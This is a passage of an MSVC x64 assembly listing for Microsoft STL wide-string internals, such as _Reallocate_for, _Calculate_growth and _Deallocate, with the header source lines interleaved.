; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00005	0f 11 01	 movups	 XMMWORD PTR [rcx], xmm0

; 2308 :     size_type _Mysize = 0; // current length of string (size)

  00008	48 89 41 10	 mov	 QWORD PTR [rcx+16], rax

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

  0000c	48 89 41 18	 mov	 QWORD PTR [rcx+24], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 1523 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  00010	48 8b c1	 mov	 rax, rcx
  00013	c3		 ret	 0
??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Convert_size@_K_K@std@@YA_K_K@Z
_TEXT	SEGMENT
_Len$ = 8
??$_Convert_size@_K_K@std@@YA_K_K@Z PROC		; std::_Convert_size<unsigned __int64,unsigned __int64>, COMDAT

; 1113 :     // convert _Unsigned_type to _Size_type, avoiding truncation
; 1114 :     _STL_INTERNAL_STATIC_ASSERT(_Unsigned_type(-1) > 0);
; 1115 :     _STL_INTERNAL_STATIC_ASSERT(_Size_type(-1) > 0);
; 1116 : 
; 1117 :     if constexpr (sizeof(_Unsigned_type) > sizeof(_Size_type)) {
; 1118 :         if (_Len > (numeric_limits<_Size_type>::max)()) {
; 1119 :             _Xlength_error("size is too long for _Size_type");
; 1120 :         }
; 1121 :     }
; 1122 : 
; 1123 :     return static_cast<_Size_type>(_Len);

  00000	48 8b c1	 mov	 rax, rcx

; 1124 : }

  00003	c3		 ret	 0
??$_Convert_size@_K_K@std@@YA_K_K@Z ENDP		; std::_Convert_size<unsigned __int64,unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z
_TEXT	SEGMENT
_Ptr$ = 8
??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z PROC			; std::_Unfancy<wchar_t>, COMDAT

; 36   :     return _Ptr;

  00000	48 8b c1	 mov	 rax, rcx

; 37   : }

  00003	c3		 ret	 0
??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ENDP			; std::_Unfancy<wchar_t>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
_TEXT	SEGMENT
this$ = 96
_New_size$ = 104
_Fn$dead$ = 112
<_Args_0>$ = 120
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>, COMDAT

; 4778 :     _CONSTEXPR20 basic_string& _Reallocate_for(const size_type _New_size, _Fty _Fn, _ArgTys... _Args) {

$LN90:
  00000	40 53		 push	 rbx
  00002	56		 push	 rsi
  00003	41 56		 push	 r14
  00005	41 57		 push	 r15
  00007	48 83 ec 38	 sub	 rsp, 56			; 00000038H

; 4779 :         // reallocate to store exactly _New_size elements, new buffer prepared by
; 4780 :         // _Fn(_New_ptr, _New_size, _Args...)
; 4781 :         if (_New_size > max_size()) {

  0000b	48 bb fe ff ff
	ff ff ff ff 7f	 mov	 rbx, 9223372036854775806 ; 7ffffffffffffffeH
  00015	4d 8b f9	 mov	 r15, r9
  00018	4c 8b f2	 mov	 r14, rdx
  0001b	48 8b f1	 mov	 rsi, rcx
  0001e	48 3b d3	 cmp	 rdx, rbx
  00021	0f 87 3b 01 00
	00		 ja	 $LN89@Reallocate
  00027	48 89 6c 24 30	 mov	 QWORD PTR [rsp+48], rbp

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  0002c	48 83 ca 07	 or	 rdx, 7

; 4783 :         }
; 4784 : 
; 4785 :         const size_type _Old_capacity = _Mypair._Myval2._Myres;

  00030	48 8b 69 18	 mov	 rbp, QWORD PTR [rcx+24]
  00034	48 89 7c 24 28	 mov	 QWORD PTR [rsp+40], rdi
  00039	4c 89 64 24 20	 mov	 QWORD PTR [rsp+32], r12

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  0003e	45 33 e4	 xor	 r12d, r12d
  00041	48 3b d3	 cmp	 rdx, rbx

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  00044	76 10		 jbe	 SHORT $LN9@Reallocate

; 4763 :             return _Max;

  00046	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  00050	48 8d 0c 00	 lea	 rcx, QWORD PTR [rax+rax]
  00054	eb 52		 jmp	 SHORT $LN71@Reallocate
$LN9@Reallocate:

; 4764 :         }
; 4765 : 
; 4766 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows

  00056	48 8b cd	 mov	 rcx, rbp
  00059	48 8b c3	 mov	 rax, rbx
  0005c	48 d1 e9	 shr	 rcx, 1
  0005f	48 2b c1	 sub	 rax, rcx
  00062	48 3b e8	 cmp	 rbp, rax
  00065	76 10		 jbe	 SHORT $LN10@Reallocate

; 4767 :             return _Max;

  00067	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  00071	48 8d 0c 00	 lea	 rcx, QWORD PTR [rax+rax]
  00075	eb 31		 jmp	 SHORT $LN71@Reallocate
$LN10@Reallocate:

; 4768 :         }
; 4769 : 
; 4770 :         return (_STD max)(_Masked, _Old + _Old / 2);

  00077	48 8d 04 29	 lea	 rax, QWORD PTR [rcx+rbp]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility

; 77   :     return _Left < _Right ? _Right : _Left;

  0007b	48 8b da	 mov	 rbx, rdx
  0007e	48 3b d0	 cmp	 rdx, rax
  00081	48 0f 42 d8	 cmovb	 rbx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  00085	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2613 :         ++_Capacity; // Take null terminator into consideration

  0008f	48 8d 4b 01	 lea	 rcx, QWORD PTR [rbx+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  00093	48 3b c8	 cmp	 rcx, rax
  00096	0f 87 c0 00 00
	00		 ja	 $LN72@Reallocate

; 74   :             _Throw_bad_array_new_length(); // multiply overflow
; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  0009c	48 03 c9	 add	 rcx, rcx

; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0009f	48 81 f9 00 10
	00 00		 cmp	 rcx, 4096		; 00001000H
  000a6	72 2c		 jb	 SHORT $LN25@Reallocate
$LN71@Reallocate:

; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  000a8	48 8d 41 27	 lea	 rax, QWORD PTR [rcx+39]

; 143  :     if (_Block_size <= _Bytes) {

  000ac	48 3b c1	 cmp	 rax, rcx
  000af	0f 86 a7 00 00
	00		 jbe	 $LN72@Reallocate

; 90   :         return ::operator new(_Bytes);

  000b5	48 8b c8	 mov	 rcx, rax
  000b8	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  000bd	48 85 c0	 test	 rax, rax
  000c0	0f 84 a2 00 00
	00		 je	 $LN64@Reallocate

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  000c6	48 8d 78 27	 lea	 rdi, QWORD PTR [rax+39]
  000ca	48 83 e7 e0	 and	 rdi, -32		; ffffffffffffffe0H

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  000ce	48 89 47 f8	 mov	 QWORD PTR [rdi-8], rax

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

  000d2	eb 12		 jmp	 SHORT $LN24@Reallocate
$LN25@Reallocate:

; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  000d4	48 85 c9	 test	 rcx, rcx
  000d7	74 0a		 je	 SHORT $LN26@Reallocate

; 90   :         return ::operator new(_Bytes);

  000d9	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  000de	48 8b f8	 mov	 rdi, rax

; 248  :         return _Traits::_Allocate(_Bytes);

  000e1	eb 03		 jmp	 SHORT $LN24@Reallocate
$LN26@Reallocate:

; 249  :     }
; 250  : 
; 251  :     return nullptr;

  000e3	49 8b fc	 mov	 rdi, r12
$LN24@Reallocate:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4793 :         _Mypair._Myval2._Myres  = _New_capacity;

  000e6	48 89 5e 18	 mov	 QWORD PTR [rsi+24], rbx

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  000ea	49 8b d7	 mov	 rdx, r15
  000ed	4b 8d 1c 36	 lea	 rbx, QWORD PTR [r14+r14]

; 4786 :         size_type _New_capacity       = _Calculate_growth(_New_size);
; 4787 :         auto& _Al                     = _Getal();
; 4788 :         const pointer _New_ptr        = _Allocate_for_capacity(_Al, _New_capacity); // throws
; 4789 : 
; 4790 :         _Mypair._Myval2._Orphan_all();
; 4791 :         _ASAN_STRING_REMOVE(*this);
; 4792 :         _Mypair._Myval2._Mysize = _New_size;

  000f1	4c 89 76 10	 mov	 QWORD PTR [rsi+16], r14

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  000f5	4c 8b c3	 mov	 r8, rbx
  000f8	48 8b cf	 mov	 rcx, rdi
  000fb	e8 00 00 00 00	 call	 memcpy

; 3426 :                 _Traits::assign(_New_ptr[_Count], _Elem());

  00100	66 44 89 24 3b	 mov	 WORD PTR [rbx+rdi], r12w

; 4794 :         _Fn(_Unfancy(_New_ptr), _New_size, _Args...);
; 4795 :         if (_Old_capacity > _Small_string_capacity) {

  00105	48 83 fd 07	 cmp	 rbp, 7
  00109	76 31		 jbe	 SHORT $LN3@Reallocate
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  0010b	48 8b 0e	 mov	 rcx, QWORD PTR [rsi]
  0010e	48 8d 14 6d 02
	00 00 00	 lea	 rdx, QWORD PTR [rbp*2+2]

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00116	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  0011d	72 18		 jb	 SHORT $LN67@Reallocate

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  0011f	4c 8b 41 f8	 mov	 r8, QWORD PTR [rcx-8]
  00123	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  00127	49 2b c8	 sub	 rcx, r8

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0012a	48 8d 41 f8	 lea	 rax, QWORD PTR [rcx-8]
  0012e	48 83 f8 1f	 cmp	 rax, 31
  00132	77 34		 ja	 SHORT $LN64@Reallocate

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  00134	49 8b c8	 mov	 rcx, r8
$LN67@Reallocate:

; 268  :         ::operator delete(_Ptr, _Bytes);

  00137	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN3@Reallocate:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4803 :         return *this;

  0013c	48 89 3e	 mov	 QWORD PTR [rsi], rdi
  0013f	48 8b c6	 mov	 rax, rsi
  00142	48 8b 7c 24 28	 mov	 rdi, QWORD PTR [rsp+40]
  00147	48 8b 6c 24 30	 mov	 rbp, QWORD PTR [rsp+48]
  0014c	4c 8b 64 24 20	 mov	 r12, QWORD PTR [rsp+32]

; 4804 :     }

  00151	48 83 c4 38	 add	 rsp, 56			; 00000038H
  00155	41 5f		 pop	 r15
  00157	41 5e		 pop	 r14
  00159	5e		 pop	 rsi
  0015a	5b		 pop	 rbx
  0015b	c3		 ret	 0
$LN72@Reallocate:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 144  :         _Throw_bad_array_new_length(); // add overflow

  0015c	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
  00161	cc		 int	 3
$LN89@Reallocate:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4782 :             _Xlen_string(); // result too long

  00162	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
  00167	cc		 int	 3
$LN64@Reallocate:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00168	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  0016d	cc		 int	 3
$LN87@Reallocate:
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z
_TEXT	SEGMENT
_Obj$dead$ = 8
??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z PROC	; std::_Destroy_in_place<wchar_t *>, COMDAT

; 308  :     if constexpr (is_array_v<_Ty>) {
; 309  :         _Destroy_range(_Obj, _Obj + extent_v<_Ty>);
; 310  :     } else {
; 311  :         _Obj.~_Ty();
; 312  :     }
; 313  : }

  00000	c2 00 00	 ret	 0
??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z ENDP	; std::_Destroy_in_place<wchar_t *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z
_TEXT	SEGMENT
_Ptr$ = 48
_Bytes$ = 56
??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z PROC		; std::_Deallocate<16,0>, COMDAT

; 255  : _CONSTEXPR20 void _Deallocate(void* _Ptr, size_t _Bytes) noexcept {

$LN17:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 256  :     // deallocate storage allocated by _Allocate when !_HAS_ALIGNED_NEW || _Align <= __STDCPP_DEFAULT_NEW_ALIGNMENT__
; 257  : #if _HAS_CXX20 // TRANSITION, GH-1532
; 258  :     if (_STD is_constant_evaluated()) {
; 259  :         ::operator delete(_Ptr);
; 260  :     } else
; 261  : #endif // _HAS_CXX20
; 262  :     {
; 263  : #if defined(_M_IX86) || defined(_M_X64)
; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00004	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  0000b	72 18		 jb	 SHORT $LN13@Deallocate

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  0000d	4c 8b 41 f8	 mov	 r8, QWORD PTR [rcx-8]
  00011	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  00015	49 2b c8	 sub	 rcx, r8

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00018	48 8d 41 f8	 lea	 rax, QWORD PTR [rcx-8]
  0001c	48 83 f8 1f	 cmp	 rax, 31
  00020	77 0c		 ja	 SHORT $LN10@Deallocate

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  00022	49 8b c8	 mov	 rcx, r8
$LN13@Deallocate:

; 269  :     }
; 270  : }

  00025	48 83 c4 28	 add	 rsp, 40			; 00000028H

; 265  :             _Adjust_manually_vector_aligned(_Ptr, _Bytes);
; 266  :         }
; 267  : #endif // defined(_M_IX86) || defined(_M_X64)
; 268  :         ::operator delete(_Ptr, _Bytes);

  00029	e9 00 00 00 00	 jmp	 ??3@YAXPEAX_K@Z		; operator delete
$LN10@Deallocate:

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0002e	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00033	cc		 int	 3
$LN15@Deallocate:
??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z ENDP		; std::_Deallocate<16,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z
_TEXT	SEGMENT
this$ = 8
_Requested$ = 16
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 4774 :         return _Calculate_growth(_Requested, _Mypair._Myval2._Myres, max_size());

  00000	48 8b 41 18	 mov	 rax, QWORD PTR [rcx+24]

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  00004	48 83 ca 07	 or	 rdx, 7
  00008	49 b9 fe ff ff
	ff ff ff ff 7f	 mov	 r9, 9223372036854775806	; 7ffffffffffffffeH
  00012	49 3b d1	 cmp	 rdx, r9

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  00015	76 04		 jbe	 SHORT $LN4@Calculate_
$LN9@Calculate_:

; 4775 :     }

  00017	49 8b c1	 mov	 rax, r9
  0001a	c3		 ret	 0
$LN4@Calculate_:

; 4766 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows

  0001b	4c 8b c0	 mov	 r8, rax
  0001e	49 8b c9	 mov	 rcx, r9
  00021	49 d1 e8	 shr	 r8, 1
  00024	49 2b c8	 sub	 rcx, r8
  00027	48 3b c1	 cmp	 rax, rcx
  0002a	77 eb		 ja	 SHORT $LN9@Calculate_

; 4767 :             return _Max;
; 4768 :         }
; 4769 : 
; 4770 :         return (_STD max)(_Masked, _Old + _Old / 2);

  0002c	49 8d 0c 00	 lea	 rcx, QWORD PTR [r8+rax]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility

; 77   :     return _Left < _Right ? _Right : _Left;

  00030	48 3b d1	 cmp	 rdx, rcx
  00033	48 0f 42 d1	 cmovb	 rdx, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4774 :         return _Calculate_growth(_Requested, _Mypair._Myval2._Myres, max_size());

  00037	48 8b c2	 mov	 rax, rdx

; 4775 :     }

  0003a	c3		 ret	 0
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z
_TEXT	SEGMENT
_Requested$ = 8
_Old$ = 16
_Max$ = 24
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  00000	48 83 c9 07	 or	 rcx, 7
  00004	49 3b c8	 cmp	 rcx, r8

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  00007	77 20		 ja	 SHORT $LN7@Calculate_

; 4763 :             return _Max;
; 4764 :         }
; 4765 : 
; 4766 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows

  00009	4c 8b ca	 mov	 r9, rdx
  0000c	49 8b c0	 mov	 rax, r8
  0000f	49 d1 e9	 shr	 r9, 1
  00012	49 2b c1	 sub	 rax, r9
  00015	48 3b d0	 cmp	 rdx, rax
  00018	77 0f		 ja	 SHORT $LN7@Calculate_

; 4770 :         return (_STD max)(_Masked, _Old + _Old / 2);

  0001a	49 8d 04 11	 lea	 rax, QWORD PTR [r9+rdx]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility

; 77   :     return _Left < _Right ? _Right : _Left;

  0001e	48 3b c8	 cmp	 rcx, rax
  00021	48 0f 42 c8	 cmovb	 rcx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4770 :         return (_STD max)(_Masked, _Old + _Old / 2);

  00025	48 8b c1	 mov	 rax, rcx

; 4771 :     }

  00028	c3		 ret	 0
$LN7@Calculate_:

; 4767 :             return _Max;

  00029	49 8b c0	 mov	 rax, r8

; 4771 :     }

  0002c	c3		 ret	 0
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
_TEXT	SEGMENT
this$dead$ = 8
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size, COMDAT

; 4166 :         const size_type _Alloc_max   = _Alty_traits::max_size(_Getal());
; 4167 :         const size_type _Storage_max = // can always store small string
; 4168 :             (_STD max)(_Alloc_max, static_cast<size_type>(_BUF_SIZE));
; 4169 :         return (_STD min)(static_cast<size_type>((numeric_limits<difference_type>::max)()),

  00000	48 b8 fe ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775806 ; 7ffffffffffffffeH

; 4170 :             _Storage_max - 1 // -1 is for null terminator and/or npos
; 4171 :         );
; 4172 :     }

  0000a	c3		 ret	 0
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >, COMDAT

; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers
; 2286 : 
; 2287 :         value_type _Buf[_BUF_SIZE];
; 2288 :         pointer _Ptr;
; 2289 :         char _Alias[_BUF_SIZE]; // TRANSITION, ABI: _Alias is preserved for binary compatibility (especially /clr)
; 2290 : 
; 2291 :         _CONSTEXPR20 void _Switch_to_buf() noexcept {
; 2292 :             _STD _Destroy_in_place(_Ptr);
; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
